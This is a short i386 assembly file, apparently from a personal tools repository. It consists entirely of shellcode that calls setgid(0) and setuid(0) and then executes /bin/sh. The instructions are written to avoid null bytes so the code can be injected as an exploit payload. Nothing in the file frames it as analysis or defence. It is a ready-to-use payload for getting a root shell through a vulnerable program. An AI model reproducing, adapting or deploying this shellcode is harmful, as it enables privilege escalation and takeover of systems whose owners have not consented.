/*
* sh.i386.s
*
* Coded by 1ndr4 (indra.kr@gmail.com)
* https://github.com/indra-kr/Tools/blob/master/tinyBinary/i386/sh.i386.s
*/

.globl _start
_start:
	/* setgid(0) */
	xorl %ebx,%ebx
	movl %ebx,%eax
	movb $46,%al
	int $0x80
	/* setuid(0) */
	xorl %ebx,%ebx
	movl %ebx,%eax
	movb $23,%al
	int $0x80
	jmp getstring
rtn:
	pop %ebx
	xorl %edx,%edx
	movl %edx,%eax
	push %edx
	push %ebx
	movl %esp,%ecx
	movb $11, %al
	int $0x80
getstring: call rtn
	.string "/bin/sh\0"
